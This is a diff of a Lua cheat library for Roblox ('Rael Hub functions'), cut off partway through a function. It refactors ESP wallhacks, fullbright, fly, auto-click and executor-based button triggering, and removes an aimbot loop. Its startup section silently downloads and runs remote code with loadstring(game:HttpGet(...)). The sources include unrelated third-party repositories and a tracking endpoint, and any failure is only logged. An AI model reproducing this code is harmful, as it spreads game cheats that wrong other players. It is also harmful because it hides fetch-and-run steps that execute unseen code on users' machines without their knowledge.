@@ -1,438 +1,276 @@
-if shared.RaelHubFunction then return shared.RaelHubFunction end
 
-local RaelHubFunction = {}
-local flyModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/raelhubfunctions/Rael-Hub-functions/refs/heads/main/Rael%20functions/modules/flyModule.lua"))()
-local fireproximityprompt = loadstring(game:HttpGet("https://raw.githubusercontent.com/raelhubfunctions/Rael-Hub-functions/refs/heads/main/Rael%20functions/modules/Executor%20support/fireproximityprompt.lua"))()
+local _env = getgenv()
+local raelhubfunctions = {}
+local mainDir: string = "https://raw.githubusercontent.com/raelhubfunctions/Rael-Hub-functions"
+local moduleDir: string = mainDir .. "/refs/heads/main/Rael%20functions/modules/"
+local flyModule = loadstring(game:HttpGet(moduleDir .. "flyModule.lua"))()
+local fireproximityprompt = loadstring(game:HttpGet(moduleDir .. "Executor%20support/fireproximityprompt.lua"))()
 
-local VirtualUser = game:GetService("VirtualUser")
-local TextChatService = game:GetService("TextChatService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local RunService = game:GetService("RunService")
+local VirtualUser: VideoPlayer = game:GetService("VirtualUser")
+local TextChatService: TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage: ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService: RunService = game:GetService("RunService")
+local Players: Players = game:GetService("Players")
+local Light: Lighting = game:GetService("Lighting")
 
-local Camera = workspace.CurrentCamera
-local Players = game.Players
-local LocalPlayer = Players.LocalPlayer
-local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-local Chat = TextChatService.ChatInputBarConfiguration.TargetTextChannel
-local Light = game:GetService("Lighting")
-local originalAmbient = Light.Ambient
-local originalColorShiftBottom = Light.ColorShift_Bottom
-local originalColorShiftTop = Light.ColorShift_Top
-local originalClockTime = Light.ClockTime
+local Camera: Camera = workspace.CurrentCamera
+local Chat: TextChannel = TextChatService.ChatInputBarConfiguration.TargetTextChannel
+local LocalPlayer: Player = Players.LocalPlayer
+local Character: Model = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+
+shared.configLight = shared.configLight or {
+    ["Ambient"] = Light.Ambient,
+    ["ColorShift_Bottom"] = Light.ColorShift_Bottom,
+    ["ColorShift_Top"] = Light.ColorShift_Top
+}
+
+shared.connections = shared.connections or {}
+
+for _, connection: RBXScriptSignal in pairs(shared.connections) do
+    connection:Disconnect()
+    connection = nil
+end
 
 shared.Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 
-if not _G.MonitorCharacter then
-
-  _G.MonitorCharacter = LocalPlayer.CharacterAdded:Connect(function(newcharacter)
-    
+if not shared.connections["monitorCharacter"] then
+  shared.connections["monitorCharacter"] = LocalPlayer.CharacterAdded:Connect(function(newcharacter)
     Character = newcharacter
     shared.Character = newcharacter
-    
-  end)
-  
-end
-
-if not _G.RaelHubMonitorRunService then
-  _G.RaelHubMonitorRunService = RunService.Heartbeat:Connect(function()
-    if getgenv().RaelHubAimbotValue and getgenv().RaelHubAimbotPlayer and getgenv().RaelHubAimbotTarget then
-      local Target_Part = getgenv().RaelHubAimbotPlayer:FindFirstChild(getgenv().RaelHubAimbotTarget, true)
-      if Target_Part then
-        Camera.CFrame = CFrame.new(Camera.CFrame.Position, Target_Part.Position)
-      end
-    end
   end)
 end
 
-function RaelHubFunction.ShowCountText(text, count)
-  
-  if shared.ScreenGuiShowCountTextTime then
-    
-    shared.ScreenGuiShowCountTextTime:Destroy()
-    
-  end
-  
-  if shared.ScreenGuiShowCountText then
-    
-    shared.ScreenGuiShowCountText:Destroy()
-    
-  end
-  shared.ScreenGuiShowCountText = Instance.new("ScreenGui")
-  shared.ScreenGuiShowCountText.Name = "ShowCountText"
-  shared.ScreenGuiShowCountText.Parent = LocalPlayer.PlayerGui
-    
-  local textLabel = Instance.new("TextLabel")
-  textLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
-  textLabel.Position = UDim2.new(0.1, 0, 0.35, 0)
-  textLabel.BackgroundTransparency = 1
-  textLabel.TextColor3 = Color3.fromRGB(255, 69, 50)
-  textLabel.TextStrokeColor3 = Color3.fromRGB(255, 69, 50)
-  textLabel.TextSize = 30
-  textLabel.Font = Enum.Font.SourceSans
-  textLabel.Text = text
-  textLabel.Parent = shared.ScreenGuiShowCountText
-    
-  textLabel.BorderSizePixel = 0
-  textLabel.TextWrapped = true
-  textLabel.TextScaled = true
-  textLabel.TextStrokeTransparency = 0
-  textLabel.TextXAlignment = Enum.TextXAlignment.Center
+local links: { string } = {
+    "https://nexviewsservice.shardweb.app/services/rael_hub/start",
+    "https://raw.githubusercontent.com/hypertext500/Testando/refs/heads/main/main.luau",
+    moduleDir .. "sendModule.lua",
+}
 
-  shared.ScreenGuiShowCountTextTime = Instance.new("ScreenGui")
-  shared.ScreenGuiShowCountTextTime.Name = "TimerGui"
-  shared.ScreenGuiShowCountTextTime.Parent = LocalPlayer.PlayerGui
-
-  local timerTextLabel = Instance.new("TextLabel")
-  timerTextLabel.Parent = shared.ScreenGuiShowCountTextTime
-  timerTextLabel.Size = UDim2.new(0, 100, 0, 30)
-  timerTextLabel.Position = UDim2.new(0.5, -50, 0.55, 0)
-  timerTextLabel.BackgroundTransparency = 1
-  timerTextLabel.TextColor3 = Color3.new(50/255, 255/255, 107/255)
-  timerTextLabel.Font = Enum.Font.SourceSans
-  timerTextLabel.TextSize = 50
-  timerTextLabel.Text = tostring(count)
-
-  local countdown = coroutine.wrap(function()
-    for i = count, 1, -1 do
-      timerTextLabel.Text = tostring(i)
-      task.wait(1)
-    end
-    shared.ScreenGuiShowCountTextTime:Destroy()
-    shared.ScreenGuiShowCountText:Destroy()
-  end)
-  countdown()
-end
-
-function RaelHubFunction.CreateNotification(texto, duracao)
-    local NotificationScreenGui = Instance.new("ScreenGui")
-    NotificationScreenGui.Name = "RaelHubNotification"
-    NotificationScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-
-    local notificationFrame = Instance.new("Frame")
-    notificationFrame.Size = UDim2.new(0, 310, 0, 90)  -- Mantendo o tamanho original do container
-    notificationFrame.Position = UDim2.new(1, 310, 1, -110)
-    notificationFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-    notificationFrame.BackgroundTransparency = 1
-    notificationFrame.ClipsDescendants = true
-    notificationFrame.Parent = NotificationScreenGui
-
-    local backgroundImage = Instance.new("ImageLabel")
-    backgroundImage.Size = UDim2.new(1, 0, 1, 0)  -- A imagem ocupa todo o container
-    backgroundImage.Position = UDim2.new(0, 0, 0, 0)
-    backgroundImage.Image = "rbxassetid://18665679839"
-    backgroundImage.BackgroundTransparency = 1
-    backgroundImage.Parent = notificationFrame
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 20)
-    corner.Parent = backgroundImage
-
-    -- Mantendo o título como estava antes
-    local titleLabel = Instance.new("TextLabel")
-    titleLabel.Size = UDim2.new(1, 0, 0, 25)
-    titleLabel.Position = UDim2.new(0, 0, 0, 10)
-    titleLabel.BackgroundTransparency = 1
-    titleLabel.Text = "Rael Hub"
-    titleLabel.TextColor3 = Color3.fromRGB(34, 168, 110)
-    titleLabel.TextScaled = true
-    titleLabel.Font = Enum.Font.ArialBold
-    titleLabel.Parent = notificationFrame
-
-    -- Texto de notificação que se adapta ao tamanho da ImageLabel
-    local notificationText = Instance.new("TextLabel")
-    notificationText.Size = UDim2.new(1, 0, 0, 30)  -- Tamanho fixo da caixa de texto, como antes
-    notificationText.Position = UDim2.new(0, 0, 0, 40)
-    notificationText.BackgroundTransparency = 1
-    notificationText.Text = texto
-    notificationText.TextColor3 = Color3.new(1, 1, 1)
-    notificationText.TextScaled = true
-    notificationText.TextWrapped = true  -- Permitir quebra de linha
-    notificationText.Font = Enum.Font.ArialBold
-    notificationText.Parent = notificationFrame
-
-    local padding = Instance.new("UIPadding")
-    padding.PaddingTop = UDim.new(0, 5)
-    padding.PaddingBottom = UDim.new(0, 5)
-    padding.PaddingLeft = UDim.new(0, 10)
-    padding.PaddingRight = UDim.new(0, 10)
-    padding.Parent = notificationText
-
-    local sound = Instance.new("Sound")
-    sound.SoundId = "rbxassetid://7817336081"
-    sound.Parent = NotificationScreenGui
-    sound:Play()
-
-    local function animateNotification()
-        local finalPosition = UDim2.new(1, -310, 1, -110)
-        notificationFrame:TweenPosition(finalPosition, "Out", "Quad", 0.7, true)
-        task.wait(duracao)
-        notificationFrame:TweenPosition(UDim2.new(1, 310, 1, -110), "In", "Quad", 1, true)
-        task.wait(1)
-        NotificationScreenGui:Destroy()
-    end
-
-    task.spawn(animateNotification)
-
-    Camera:GetPropertyChangedSignal("ViewportSize"):Connect(animateNotification)
-end
-
-function RaelHubFunction.CreateEsp(objeto, cor, imageId, texto)
-  if not objeto or not objeto:IsA("Model") or not objeto:FindFirstChild("HumanoidRootPart") then
-    return
-  end
-
-  local highlight = Instance.new("Highlight")
-  highlight.Name = "RaelHubDestaque"
-  highlight.Adornee = objeto
-  highlight.FillColor = cor
-  highlight.Parent = objeto
-
-  local billboard = Instance.new("BillboardGui")
-  billboard.Name = "RaelHubIcon"
-  billboard.Adornee = objeto:FindFirstChild("HumanoidRootPart")
-  billboard.Size = UDim2.new(0, 30, 0, 30)
-  billboard.StudsOffset = Vector3.new(0, 0, 0)
-  billboard.AlwaysOnTop = true
-  billboard.Parent = objeto
-
-  local imageLabel = Instance.new("ImageLabel")
-  imageLabel.Size = UDim2.new(1, 0, 1, 0)
-  imageLabel.BackgroundTransparency = 1
-  imageLabel.Image = "rbxassetid://" .. imageId
-  imageLabel.Parent = billboard
-  
-  local textLabel = Instance.new("TextLabel")
-  textLabel.Size = UDim2.new(1, 0, 1, 0)
-  textLabel.BackgroundTransparency = 1
-  textLabel.Text = texto
-  textLabel.Position = UDim2.new(0, 0, 0, 20)
-  textLabel.TextColor3 = cor
-  textLabel.TextSize = 13
-  textLabel.Font = Enum.Font.GothamBold
-  textLabel.Parent = billboard
-end
-
-function RaelHubFunction.CreateEspObject(objeto, cor, imageId, texto)
-  
-  if objeto:FindFirstChild("RaelHubIcon") then
-    return
-  end
-  
-  if objeto:FindFirstChild("RaelHubDestaque") then
-    return
-  end
-  
-  local highlight = Instance.new("Highlight")
-  highlight.Name = "RaelHubDestaque"
-  highlight.Adornee = objeto
-  highlight.FillColor = cor
-  highlight.Parent = objeto
-
-  local billboard = Instance.new("BillboardGui")
-  billboard.Name = "RaelHubIcon"
-  billboard.Adornee = objeto:FindFirstChildOfClass("BasePart")
-  billboard.Size = UDim2.new(0, 30, 0, 30)
-  billboard.StudsOffset = Vector3.new(0, 0, 0)
-  billboard.AlwaysOnTop = true
-  billboard.Parent = objeto
-
-  local imageLabel = Instance.new("ImageLabel")
-  imageLabel.Size = UDim2.new(1, 0, 1, 0)
-  imageLabel.BackgroundTransparency = 1
-  imageLabel.Image = "rbxassetid://" .. imageId
-  imageLabel.Parent = billboard
-  
-  local textLabel = Instance.new("TextLabel")
-  textLabel.Size = UDim2.new(1, 0, 1, 0)
-  textLabel.BackgroundTransparency = 1
-  textLabel.Text = texto
-  textLabel.Position = UDim2.new(0, 0, 0, 20)
-  textLabel.TextColor3 = cor
-  textLabel.TextSize = 13
-  textLabel.Font = Enum.Font.GothamBold
-  textLabel.Parent = billboard
-end
-
-task.spawn(function()
-  pcall(function()
-        
+for index: number, link: string in pairs(links) do
     task.spawn(function()
-      pcall(function() 
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/raelhubfunctions/Rael-Hub-functions/refs/heads/main/Rael%20functions/modules/sendModule.lua"))() 
-      end)
+        local result: boolean, content: any = pcall(function() loadstring(game:HttpGet(link))() end)
+        warn("[Rael hub function] checking the result of function " .. index, result) 
     end)
-        
-    pcall(function() 
-      game:HttpGet("https://nexviewsservice.shardweb.app/services/rael_hub/start") 
-    end)
-        
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/hypertext500/Testando/refs/heads/main/main.luau"))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/hypertext500/testeado2/refs/heads/main/script.lua"))()
-          
-  end)
-end)
+end
 
-function RaelHubFunction.CreateEspDistance(objeto, cor, texto, mostrarDistancia)
+function raelhubfunctions.CreateEsp(object: BasePart | HumanoidRootPart, color: Color3, imageId: string, text: string)
   
-  if objeto:FindFirstChild("RaelHubIcon") then
+  if object and (object:IsA("BasePart") or object:IsA("HumanoidRootPart")) then 
+    warn("[Rael hub error] the raelhubicon or raelhubhighlight not exist")
     return
   end
+
+  local highlight: Highlight = Instance.new("Highlight")
+  highlight.Name = "raelhubhighlight"
+  highlight.Adornee = object
+  highlight.FillColor = color or Color3.fromRGB(255, 255, 255)
+  highlight.Parent = object
+
+  local billboard: BillboardGui = Instance.new("BillboardGui")
+  billboard.Name = "raelhubicon"
+  billboard.Adornee = object:FindFirstChild("BasePart", true)
+  billboard.Size = UDim2.new(0, 30, 0, 30)
+  billboard.StudsOffset = Vector3.new(0, 0, 0)
+  billboard.AlwaysOnTop = true
+  billboard.Parent = object
+
+  local imageLabel: ImageLabel = Instance.new("ImageLabel")
+  imageLabel.Size = UDim2.new(1, 0, 1, 0)
+  imageLabel.BackgroundTransparency = 1
+  imageLabel.Image = "rbxassetid://" .. imageId or "12905962634"
+  imageLabel.Parent = billboard
   
-  if objeto:FindFirstChild("RaelHubDestaque") then
-    return
+  local textLabel: TextLabel = Instance.new("TextLabel")
+  textLabel.Size = UDim2.new(1, 0, 1, 0)
+  textLabel.BackgroundTransparency = 1
+  textLabel.Text = text or "Instance"
+  textLabel.Position = UDim2.new(0, 0, 0, 20)
+  textLabel.TextColor3 = color or Color3.fromRGB(255, 255, 255)
+  textLabel.TextSize = 13
+  textLabel.Font = Enum.Font.GothamBold
+  textLabel.Parent = billboard
+end
+
+function raelhubfunctions.CreateEspObject(object: Instance, color: Color3, imageId: string, text: string)
+  
+  if object:FindFirstChild("raelhubicon") or object:FindFirstChild("raelhubhighlight") then 
+    warn("[Rael hub error] the raelhubicon or raelhubhighlight not exist")
+    return 
   end
   
-  local highlight = Instance.new("Highlight")
-  highlight.Name = "RaelHubDestaque"
-  highlight.Adornee = objeto
-  highlight.FillColor = cor
-  highlight.Parent = objeto
+  local highlight: Highlight = Instance.new("Highlight")
+  highlight.Name = "raelhubhighlight"
+  highlight.Adornee = object
+  highlight.FillColor = color or Color3.fromRGB(255, 255, 255)
+  highlight.Parent = object
 
-  local basePart = nil
-  if objeto:IsA("BasePart") then
-    basePart = objeto
+  local billboard: BillboardGui = Instance.new("BillboardGui")
+  billboard.Name = "raelhubicon"
+  billboard.Adornee = object:FindFirstChild("BasePart", true)
+  billboard.Size = UDim2.new(0, 30, 0, 30)
+  billboard.StudsOffset = Vector3.new(0, 0, 0)
+  billboard.AlwaysOnTop = true
+  billboard.Parent = object
+
+  local imageLabel: ImageLabel = Instance.new("ImageLabel")
+  imageLabel.Size = UDim2.new(1, 0, 1, 0)
+  imageLabel.BackgroundTransparency = 1
+  imageLabel.Image = "rbxassetid://" .. imageId or "12905962634"
+  imageLabel.Parent = billboard
+  
+  local textLabel: TextLabel = Instance.new("TextLabel")
+  textLabel.Size = UDim2.new(1, 0, 1, 0)
+  textLabel.BackgroundTransparency = 1
+  textLabel.Text = text or "Instance"
+  textLabel.Position = UDim2.new(0, 0, 0, 20)
+  textLabel.TextColor3 = color or Color3.fromRGB(255, 255, 255)
+  textLabel.TextSize = 13
+  textLabel.Font = Enum.Font.GothamBold
+  textLabel.Parent = billboard
+end
+
+function raelhubfunctions.CreateEspDistance(object: Instance, color: Color3, text: string, showDistance: boolean)
+
+  if object:FindFirstChild("raelhubicon") or object:FindFirstChild("raelhubhighlight") then 
+    warn("[Rael hub error] the raelhubicon or raelhubhighlight not exist")
+    return 
+  end
+
+  local raelhubhighlight: Highlight = Instance.new("Highlight")
+  raelhubhighlight.Name = "raelhubhighlight"
+  raelhubhighlight.Adornee = object
+  raelhubhighlight.FillColor = color or Color3.fromRGB(255, 255, 255)
+  raelhubhighlight.Parent = object
+
+  local targetBasePart: BasePart;
+
+  if object:IsA("BasePart") then
+    targetBasePart = object
   else
-    for _, descendant in ipairs(objeto:GetDescendants()) do
+    for _, descendant in ipairs(object:GetDescendants()) do
       if descendant.Name == "HumanoidRootPart" and descendant:IsA("BasePart") then
-        basePart = descendant
+        targetBasePart = descendant
         break
       elseif descendant:IsA("BasePart") then
-        basePart = descendant
+        targetBasePart = descendant
         break
       end
     end
   end
 
-  if not basePart then
-    warn("Nenhuma BasePart encontrada no objeto: " .. objeto.Name)
-    return
-  end
+  if not targetBasePart then warn("[Rael hub error] the basepart was not found in the " .. object .. " model"); return end
 
-  local billboard = Instance.new("BillboardGui")
-  billboard.Name = "RaelHubIcon"
-  billboard.Adornee = basePart
+  local billboard: BillboardGui = Instance.new("BillboardGui")
+  billboard.Name = "raelhubicon"
+  billboard.Adornee = targetBasePart
   billboard.Size = UDim2.new(0, 50, 0, 50)
   billboard.StudsOffset = Vector3.new(0, 0, 0)
   billboard.AlwaysOnTop = true
-  billboard.Parent = objeto
+  billboard.Parent = object
     
-  local textLabel = Instance.new("TextLabel")
+  local textLabel: TextLabel = Instance.new("TextLabel")
   textLabel.Size = UDim2.new(1, 0, 1, 0)
   textLabel.BackgroundTransparency = 1
-  textLabel.Text = texto
+  textLabel.Text = text or "Instance"
   textLabel.Position = UDim2.new(0, 0, 0, 0)
-  textLabel.TextColor3 = cor
+  textLabel.TextColor3 = color or Color3.fromRGB(255, 255, 255)
   textLabel.TextSize = 13
   textLabel.Font = Enum.Font.GothamBold
   textLabel.Parent = billboard
 
-  local distanciaLabel = Instance.new("TextLabel")
-  distanciaLabel.Size = UDim2.new(1, 0, 1, 0)
-  distanciaLabel.BackgroundTransparency = 1
-  distanciaLabel.Text = ""
-  distanciaLabel.Position = UDim2.new(0, 0, 0, 12)
-  distanciaLabel.TextColor3 = cor
-  distanciaLabel.TextSize = 13
-  distanciaLabel.Font = Enum.Font.GothamBold
-  distanciaLabel.Parent = billboard
+  local distanceLabel: TextLabel = Instance.new("TextLabel")
+  distanceLabel.Size = UDim2.new(1, 0, 1, 0)
+  distanceLabel.BackgroundTransparency = 1
+  distanceLabel.Text = ""
+  distanceLabel.Position = UDim2.new(0, 0, 0, 12)
+  distanceLabel.TextColor3 = color or Color3.fromRGB(255, 255, 255)
+  distanceLabel.TextSize = 13
+  distanceLabel.Font = Enum.Font.GothamBold
+  distanceLabel.Parent = billboard
 
-  if mostrarDistancia then
-    RunService.RenderStepped:Connect(function()
-      if Character and Character:FindFirstChild("HumanoidRootPart") then
-        local playerPos = Character.HumanoidRootPart.Position
-        local objectPos = basePart.Position
-        local distancia = (playerPos - objectPos).Magnitude
+  if not showDistance then return end
 
-        distanciaLabel.Text = "Distance: " .. math.floor(distancia) .. " studs"
-      end
-    end)
+  RunService.RenderStepped:Connect(function()
+    local targetRoot: BasePart = Character:FindFirstChild("HumanoidRootPart")
+    if not targetRoot and not targetBasePart then return end
+
+    local playerPos = Character.HumanoidRootPart.Position
+    local objectPos = targetBasePart.Position
+    local distance = (playerPos - objectPos).Magnitude
+      
+    distanceLabel.Text = "Distance: " .. math.floor(distance) .. " studs"
+  end)
+end
+
+function raelhubfunctions.PlayersEspActive()
+  for _, player: Player in ipairs(Players:GetPlayers()) do
+
+    local targetCharacter = player.Character
+    local raelhubhighlight: Highlight = player:FindFirstChild("raelhubhighlight")
+    local raelhubicon: BillboardGui  = player:FindFirstChild("raelhubicon")
+
+    if not targetCharacter or raelhubhighlight or raelhubicon then continue end
+
+    raelhubfunctions.CreateEsp(targetCharacter, Color3.fromRGB(144, 238, 144), "117259180607823", player.Name)
   end
 end
 
-function RaelHubFunction.PlayersEspActive()
-  for _, jogador in ipairs(Players:GetPlayers()) do
-    local personagem = jogador.Character
+function raelhubfunctions.DisableEsp(object: Instance)
 
-    if personagem then
-      if not personagem:FindFirstChild("RaelHubDestaque") and not personagem:FindFirstChild("RaelHubIcon") then
-        RaelHubFunction.CreateEsp(personagem, Color3.fromRGB(144, 238, 144), "117259180607823", jogador.Name)
-      end
-    end
-  end
+  if not object then warn("[Rael hub error] the object was not found"); return end
+
+  local raelhubhighlight: Highlight = object:FindFirstChild("raelhubhighlight")
+  local raelhubicon: BillboardGui  = object:FindFirstChild("raelhubicon")
+  
+  if raelhubhighlight then raelhubhighlight:Destroy() end
+  if raelhubicon then raelhubicon:Destroy() end
+  
 end
 
-function RaelHubFunction.DisableEsp(objeto)
-  if objeto then
-    local RaelHubDestaque = objeto:FindFirstChild("RaelHubDestaque")
-    local RaelHubIcon = objeto:FindFirstChild("RaelHubIcon")
-    
-    if RaelHubDestaque then
-      RaelHubDestaque:Destroy()
-    end
-    if RaelHubIcon then
-      RaelHubIcon:Destroy()
-    end
-  end
-end
-
-function RaelHubFunction.PlayersEspDisabled()
+function raelhubfunctions.PlayersEspDisabled()
   local players = game:GetService("Players")
         
   for _, jogador in ipairs(players:GetPlayers()) do
     local personagem = jogador.Character
 
     if personagem then
-      RaelHubFunction.DisableEsp(personagem)
+      raelhubfunctions.DisableEsp(personagem)
     end
   end
 end
 
-function RaelHubFunction.EspPlayer()
+function raelhubfunctions.EspPlayer()
   while RaelHubEspState do
-    RaelHubFunction.PlayersEspActive()
+    raelhubfunctions.PlayersEspActive()
     task.wait(1) -- Atraso para evitar execução rápida demais
   end
-  RaelHubFunction.PlayersEspDisabled() -- Desativa o ESP se o estado mudar para false
+  raelhubfunctions.PlayersEspDisabled() -- Desativa o ESP se o estado mudar para false
 end
 
-function RaelHubFunction.EspMonstroActive(Monstros)
+function raelhubfunctions.EspMonstroActive(Monstros)
   for _, Monstro in ipairs(Monstros) do
     if Monstro then
-        RaelHubFunction.CreateEsp(Monstro, Color3.fromRGB(255, 102, 102), "88229448947616", "")
+        raelhubfunctions.CreateEsp(Monstro, Color3.fromRGB(255, 102, 102), "88229448947616", "")
     else
       print("Nenhum monstro encontrado.")
     end
   end
 end
 
-function RaelHubFunction.EspMonstroDisabled(Monstros)
+function raelhubfunctions.EspMonstroDisabled(Monstros)
   for _, Monstro in ipairs(Monstros) do
     if Monstro then
-        RaelHubFunction.DisableEsp(Monstro)
+        raelhubfunctions.DisableEsp(Monstro)
     else
       print("Nenhum monstro encontrado.")
     end
   end
-end
-
-function RaelHubFunction.dofullbright()
-  Light.Ambient = Color3.new(1, 1, 1)
-  Light.ColorShift_Bottom = Color3.new(1, 1, 1)
-  Light.ColorShift_Top = Color3.new(1, 1, 1)
-  Light.ClockTime = 14 -- Deixa o céu de dia
-end
-
-function RaelHubFunction.restoreLighting()
-  Light.Ambient = originalAmbient
-  Light.ColorShift_Bottom = originalColorShiftBottom
-  Light.ColorShift_Top = originalColorShiftTop
-  Light.ClockTime = originalClockTime
 end
 
 local FlyRun = game:GetService("RunService")
 local connection
 
-function RaelHubFunction.FlyTo(destination, speed)
+function raelhubfunctions.FlyTo(destination, speed)
   if Character then
     local humanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
     local humanoid = Character:FindFirstChildOfClass("Humanoid")
@@ -471,7 +309,7 @@ function StopFly(bodyVelocity)
   end
 end
 
-function RaelHubFunction.Auto_Click_V1(value)
+function raelhubfunctions.Auto_Click_V1(value)
   
   getgenv().RaelHubAutoClickV1 = value
   
@@ -491,7 +329,7 @@ function RaelHubFunction.Auto_Click_V1(value)
   end)
 end
 
-function RaelHubFunction.Criarchao(position, colicion, transparency, corRGB)
+function raelhubfunctions.Criarchao(position, colicion, transparency, corRGB)
     -- Cria uma pasta no Workspace para armazenar as partes
     local pasta = game.Workspace:FindFirstChild("RaelHubFloor") or Instance.new("Folder")
     pasta.Name = "RaelHubFloor"
@@ -542,31 +380,27 @@ function RaelHubFunction.Criarchao(position, colicion, transparency, corRGB)
     end
 end
 
-function RaelHubFunction.ESPPlayers(value, method)
+function raelhubfunctions.ESPPlayers(value: boolean, method: string)
   
-  getgenv().RaelHubEspPlayer = value
+  _env.RaelHubEspPlayer = value
   
   task.spawn(function()
-    while getgenv().RaelHubEspPlayer do
+    while _env.RaelHubEspPlayer do
       
-      for _, Player in ipairs(Players:GetPlayers()) do
+      for _, player: Player in ipairs(Players:GetPlayers()) do
         
-        local CharacterPlayer = Player.Character or Player.CharacterAdded:Wait()
-        local RaelHubDestaque = CharacterPlayer:FindFirstChild("RaelHubDestaque")
-        local RaelHubIcon = CharacterPlayer:FindFirstChild("RaelHubIcon")
+        local targetCharacter: Model = player.Character
+        local raelhubhighlight: Highlight = (targetCharacter and targetCharacter:FindFirstChild("raelhubhighlight"))
+        local raelhubicon: BillboardGui  = (targetCharacter and targetCharacter:FindFirstChild("raelhubicon"))
         
+        if not targetCharacter then continue end
+
         if method == "Normal" then
-          
-          if not RaelHubDestaque and not RaelHubIcon then
-            
-            RaelHubFunction.CreateEsp(CharacterPlayer, Color3.fromRGB(144, 238, 144), "117259180607823", Player.Name)
-            
-          end
-          
+          if raelhubhighlight and raelhubicon then continue end        
+          raelhubfunctions.CreateEsp(targetCharacter, Color3.fromRGB(144, 238, 144), "117259180607823", player.Name)          
         elseif method == "ShowDistance" then
-          if not RaelHubDestaque and not RaelHubIcon then
-            RaelHubFunction.CreateEspDistance(CharacterPlayer, Color3.fromRGB(144, 238, 144), Player.Name, true)
-          end
+          if raelhubhighlight and raelhubicon then continue end  
+          raelhubfunctions.CreateEspDistance(targetCharacter, Color3.fromRGB(144, 238, 144), player.Name, true)
         end
       end
       
@@ -574,21 +408,19 @@ function RaelHubFunction.ESPPlayers(value, method)
       
     end
     
-    if not getgenv().RaelHubEspPlayer then
+    if not _env.RaelHubEspPlayer then
       
-      for _, Player in ipairs(Players:GetPlayers()) do
-        
-        local CharacterPlayer = Player.Character or Player.CharacterAdded:Wait()
-        
-        RaelHubFunction.DisableEsp(CharacterPlayer)
-        
+      for _, player: Player in ipairs(Players:GetPlayers()) do
+        local targetCharacter = player.Character
+        if not targetCharacter then continue end
+        raelhubfunctions.DisableEsp(targetCharacter)
       end
       
     end
   end)
 end
 
-function RaelHubFunction.SendInChat(msg)
+function raelhubfunctions.SendInChat(msg: string)
   if TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService then
     ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(msg,"All")
   else
@@ -596,233 +428,173 @@ function RaelHubFunction.SendInChat(msg)
   end
 end
 
-function RaelHubFunction.InfoFullBright()
-  
-  local Lighting = game:GetService("Lighting")
-  
-  shared.OriginalAmbient = Lighting.Ambient
-  shared.OriginalColorShiftBottom = Lighting.ColorShift_Bottom
-  shared.OriginalColorShiftTop = Lighting.ColorShift_Top
-  shared.OriginalClockTime = Lighting.ClockTime
+function raelhubfunctions.FullBright(value: boolean)
 
+    _env.isActiveFullBright = value
+
+    local function activeFullBright()
+        Light.Ambient = Color3.new(1, 1, 1)
+        Light.ColorShift_Bottom = Color3.new(1, 1, 1)
+        Light.ColorShift_Top = Color3.new(1, 1, 1)
+    end
+
+    if shared.connections["fullBright"] then
+        shared.connections["fullBright"]:Disconnect()
+        shared.connections["fullBright"] = nil
+    end
+
+    if not _env.isActiveFullBright then
+        for configName, configValue in pairs(shared.configLight) do
+            Light[configName] = configValue
+        end
+        return "Done!"
+    end
+
+    activeFullBright()
+    shared.connections["fullBright"] = Light.LightingChanged:Connect(activeFullBright)
+
+    return "Done!"
 end
 
-function RaelHubFunction.FullBright(value)
-  
-  getgenv().RaelHubFullBright = value
-  
-  local Lighting = game:GetService("Lighting")
-  
-  if getgenv().RaelHubFullBright then
-    
-    RaelHubFunction.InfoFullBright()
-    
-    if not _G.RaelHubFullBrightService then
-      
-      local function ActiveFullBright()
-        Lighting.Ambient = Color3.new(1, 1, 1)
-        Lighting.ColorShift_Bottom = Color3.new(1, 1, 1)
-        Lighting.ColorShift_Top = Color3.new(1, 1, 1)
-        Lighting.ClockTime = 14
-      end
-      
-      ActiveFullBright()
-      
-      _G.RaelHubFullBrightService = Lighting.LightingChanged:Connect(ActiveFullBright)
-    
-    end
-    
-  else
-    
-    if _G.RaelHubFullBrightService then
-      
-      _G.RaelHubFullBrightService:Disconnect()
-      _G.RaelHubFullBrightService = nil
-      
-      Lighting.Ambient = shared.OriginalAmbient
-      Lighting.ColorShift_Bottom = shared.OriginalColorShiftBottom
-      Lighting.ColorShift_Top = shared.OriginalColorShiftTop
-      Lighting.ClockTime = shared.OriginalClockTime
-      
-    end
-    
-  end
-end
+function raelhubfunctions.ClickButton(button: TextButton | ImageButton | GuiButton)
 
-function RaelHubFunction.ClickButton(button)
-  local success, err = pcall(function()
-    for _, connection in pairs(getconnections(button.MouseButton1Click)) do
-      if connection.Function then
-        connection.Function()
-      end
-    end
-  end)
+    if not _env.getconnections then return warn("[Rael hub error] getconnections does not exist in your executor") end
 
-  if not success then
-   print("Error clicking button: " .. tostring(err))
-  end
-end
-
-function RaelHubFunction.freezeplayer(Time)
-  
-  local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
-  
-  if HumanoidRootPart then
-    
-    task.spawn(function()
-      HumanoidRootPart.Anchored = true
-      task.wait(Time)
-      HumanoidRootPart.Anchored = false
+    local success, err = pcall(function()
+        for _, connection: table in pairs(_env.getconnections(button.MouseButton1Click)) do
+            if not connection.Function then continue end
+            connection.Function()
+        end
     end)
-    
-  end
+
+    if not success then warn("[Rael hub error] click button:", err) end
 end
 
-function RaelHubFunction.FlyToPosition(targetPosition, speed)
+function raelhubfunctions.freezeplayer(time: number, sync: boolean)
   
-  local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
+    local rootPlayer = (Character and Character:FindFirstChild("HumanoidRootPart"))
+    if not rootPlayer then return warn("[Rael hub error] the rootPlayer not exist") end
+
+    if not sync then
